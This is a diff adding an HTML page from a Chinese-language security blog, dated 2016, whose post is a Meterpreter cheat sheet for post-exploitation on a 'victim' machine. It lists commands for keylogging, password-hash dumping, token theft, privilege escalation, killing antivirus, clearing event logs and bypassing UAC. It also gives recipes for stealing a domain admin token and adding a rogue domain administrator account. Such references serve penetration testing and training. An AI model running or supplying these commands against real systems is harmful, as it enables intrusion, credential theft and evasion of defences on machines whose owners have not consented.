@@ -1,0 +1,746 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="Hexo,next" />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title>  // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2016-02-15
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/02/15/Meterpreter Cheet Sheet/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/02/15/Meterpreter Cheet Sheet/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <p>Meterpreter Cheet Sheet</p>
+<h1 id="命令总览">命令总览</h1><p>第1步：核心命令</p>
+<p>在其最基本的使用，meterpreter 是一个 Linux 终端在受害者的计算机上。这样，我们的许多基本的Linux命令可以用在meterpreter甚至是在一个窗口或其他操作系统。</p>
+<p>这里有一些核心的命令可以用在meterpreter。</p>
+<p>? – 帮助菜单</p>
+<p>background – 将当前会话移动到后台</p>
+<p>bgkill – 杀死一个后台 meterpreter 脚本</p>
+<p>bglist – 提供所有正在运行的后台脚本的列表</p>
+<p>bgrun – 作为一个后台线程运行脚本</p>
+<p>channel – 显示活动频道</p>
+<p>close – 关闭通道</p>
+<p>exit – 终止 meterpreter 会话</p>
+<p>help – 帮助菜单</p>
+<p>interact – 与通道进行交互</p>
+<p>irb – 进入 Ruby 脚本模式</p>
+<p>migrate – 移动到一个指定的 PID 的活动进程</p>
+<p>quit – 终止 meterpreter 会话</p>
+<p>read – 从通道读取数据</p>
+<p>run – 执行以后它选定的 meterpreter 脚本</p>
+<p>use – 加载 meterpreter 的扩展</p>
+<p>write – 将数据写入到一个通道</p>
+<p>第2步：文件系统命令</p>
+<p>cat -读取并输出到标准输出文件的内容</p>
+<p>cd -更改目录</p>
+<p>del -删除文件</p>
+<p>download-从Client系统文件下载</p>
+<p>edit-用 vim编辑文件</p>
+<p>getlwd -打印本地目录</p>
+<p>getwd -打印工作目录</p>
+<p>lcd -更改本地目录</p>
+<p>lpwd -打印本地目录</p>
+<p>ls -列出在当前目录中的文件列表</p>
+<p>mkdir -在受害者系统上的创建目录</p>
+<p>pwd -输出工作目录</p>
+<p>rm -删除文件</p>
+<p>rmdir -受害者系统上删除目录</p>
+<p>upload-从Server的系统往Clinet系统上传文件</p>
+<p>第 3 步： 网络命令</p>
+<p>ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。</p>
+<p>portfwd -端口转发</p>
+<p>route -查看或修改受害者路由表</p>
+<p>第 4 步： 系统命令</p>
+<p>clearav -清除了Client的计算机上的事件日志</p>
+<p>drop_token -被盗的令牌</p>
+<p>execute-执行命令</p>
+<p>getpid -获取当前进程 ID (PID)</p>
+<p>getprivs -尽可能获取尽可能多的特权</p>
+<p>getuid -获取作为运行服务器的用户</p>
+<p>kill -终止指定 PID 的进程</p>
+<p>ps -列出正在运行的进程</p>
+<p>reboot-重新启动受害人的计算机</p>
+<p>reg -与受害人的注册表进行交互</p>
+<p>rev2self -在受害者机器上调用 RevertToSelf()</p>
+<p>shell -在受害者计算机上打开一个shell</p>
+<p>shutdown-关闭了受害者的计算机</p>
+<p>steal_token -试图窃取指定的 (PID) 进程的令牌</p>
+<p>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息</p>
+<p>第 5 步： 用户界面命令</p>
+<p>enumdesktops -列出所有可访问台式机</p>
+<p>getdesktop -获取当前的 meterpreter 桌面</p>
+<p>idletime -检查长时间以来，受害者系统空闲进程</p>
+<p>keyscan_dump -键盘记录软件的内容转储</p>
+<p>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件</p>
+<p>keyscan_stop -停止键盘记录软件</p>
+<p>screenshot-抓去 meterpreter 桌面的屏幕截图</p>
+<p>set_desktop -更改 meterpreter 桌面</p>
+<p>uictl -启用用户界面组件的一些控件</p>
+<p>第 6 步： 特权升级命令</p>
+<p>getsystem -获得系统管理员权限</p>
+<p>第 7 步： 密码转储命令</p>
+<p>hashdump -抓去哈希密码 (SAM) 文件中的值</p>
+<p>请注意 hashdump 会可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。查找更多关于那些在我即将举行的 meterpreter 脚本作弊。</p>
+<p>第 8 步： Timestomp 命令</p>
+<p>timestomp -操作修改，访问，并创建一个文件的属性</p>
+<h1 id="后渗透场景分析">后渗透场景分析</h1><p>在windows主机上使用meterpreter进行提权操作：<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">use</span> <span class="keyword">priv</span></span><br><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure></p>
+<p>从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中：</p>
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">ps</span></span><br><span class="line">meterpreter &gt; steal_token <span class="number">1784</span></span><br><span class="line">meterpreter &gt; <span class="literal">shell</span></span><br><span class="line"><span class="constant">C</span>:\windows\system32&gt;net <span class="keyword">user</span> metasploit <span class="literal">password</span> /<span class="constant">A</span>DD /<span class="constant">D</span>OMAIN</span><br><span class="line"><span class="constant">C</span>:\windows\system32&gt;net <span class="literal">group</span> <span class="string">"Domain Admins"</span> metasploit /<span class="constant">A</span>DD /<span class="constant">D</span>OMAIN</span><br></pre></td></tr></table></figure>
+<p>从SAM数据库中导出密码的哈希值：<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">use</span> <span class="keyword">priv</span></span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure></p>
+<p>注意：在windows 2008 中，如果getsystem命令和hashdump命令抛出异常情况时，你需要迁移到一个以SYSTEM系统权限运行的进程中。</p>
+<p>自动迁移到一个独立进程：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="command">run</span> migrate</span><br></pre></td></tr></table></figure></p>
+<p>通过meterpreter的killav脚本来杀死目标主机运行的杀毒软件：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="command">run</span> killav</span><br></pre></td></tr></table></figure></p>
+<p>针对一个特定的进程捕获目标主机上的键盘记录：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">meterpreter</span> &gt; ps</span><br><span class="line">meterpreter &gt; migrate <span class="number">14360</span></span><br><span class="line">meterpreter &gt;keyscan_start</span><br><span class="line">meterpreter &gt;keyscan_dump</span><br><span class="line">meterpreter &gt;keyscan_stop</span><br></pre></td></tr></table></figure></p>
+<p>使用匿名方式来假冒管理员：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;use incognito</span><br><span class="line">meterpreter &gt;<span class="keyword">list_t</span>okens -u</span><br><span class="line">meterpreter &gt;use priv</span><br><span class="line">meterpreter &gt;getsystem</span><br><span class="line">meterpreter &gt;<span class="keyword">list_t</span>okens</span><br><span class="line">meterpreter &gt;<span class="keyword">impersonate_t</span>oken IHAZSECURITY\\Administrator</span><br></pre></td></tr></table></figure></p>
+<p>查看目标主机都采用了那些防护措施，列出帮助菜单，关闭防火墙以及其它我们发现的防护措施：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="keyword">run</span> getcountermeasure</span><br><span class="line">meterpreter &gt;<span class="keyword">run</span> getcountermeasuer -<span class="literal">h</span></span><br><span class="line">meterpreter &gt;<span class="keyword">run</span> getcountermeasuer -<span class="keyword">d</span> -k</span><br></pre></td></tr></table></figure></p>
+<p>识别被控制的主机是否是一台虚拟机：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="command">run</span>  checkvm</span><br></pre></td></tr></table></figure></p>
+<p>在一个meterpreter会话界面中使用cmd shell：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></p>
+<p>获取目标主机的图形界面（VNC）：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="command">run</span> vnc</span><br></pre></td></tr></table></figure></p>
+<p>使正在运行的meterpreter界面在后台运行：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">meterpreter</span> &gt;background</span><br></pre></td></tr></table></figure></p>
+<p>绕过windows的用户账户控制（UAC）机制：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="keyword">run</span> <span class="keyword">post</span>/windows/escalate/bypassuac</span><br></pre></td></tr></table></figure></p>
+<p>导出苹果OS-X系统的口令哈希值：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="keyword">run</span> <span class="keyword">post</span>/osx/gather/hashdump</span><br></pre></td></tr></table></figure></p>
+<p>导出liunx系统的口令哈希值：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;<span class="keyword">run</span> <span class="keyword">post</span>/linux/gather/hashdump</span><br></pre></td></tr></table></figure></p>
+<p>提醒：上面的命令一定要弄懂原理，然后才能举一反三，才能把meterpreter发挥的淋漓尽致！<br>就写到这里了，本来想弄图片的，为了大家用起来方便，还是手打上去吧！” </p>
+<p>由于meterpreter太过强大，以后有时间，还会补充的。</p>
+<h1 id="刚拿到meterpreter_session应该做什么">刚拿到meterpreter session应该做什么</h1><ol>
+<li>ps 查看AV情况</li>
+<li>看是否有必要 migrate</li>
+<li>sysinfo查看系统信息</li>
+</ol>
+<h1 id="参考资料">参考资料</h1><p>[1] <a href="https://www.91ri.org/8476.html" target="_blank" rel="external">Metasploit工具Meterpreter的命令速查表</a><br>[2] <a href="http://www.metasploit.cn/thread-640-1-1.html" target="_blank" rel="external">Meterpreter后渗透攻击命令</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/02/15/meterpreter-cheet-sheet/">Meterpreter Cheet Sheet</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/02/15/web-pentest-tools/">web前端挖掘与渗透工具集合</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/02/15/Meterpreter Cheet Sheet/"
+               data-title="" data-url="http://blkstone.github.io/2016/02/15/Meterpreter Cheet Sheet/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">140</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">11</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">57</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#命令总览"><span class="nav-number">1.</span> <span class="nav-text">命令总览</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后渗透场景分析"><span class="nav-number">2.</span> <span class="nav-text">后渗透场景分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#刚拿到meterpreter_session应该做什么"><span class="nav-number">3.</span> <span class="nav-text">刚拿到meterpreter session应该做什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2016
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
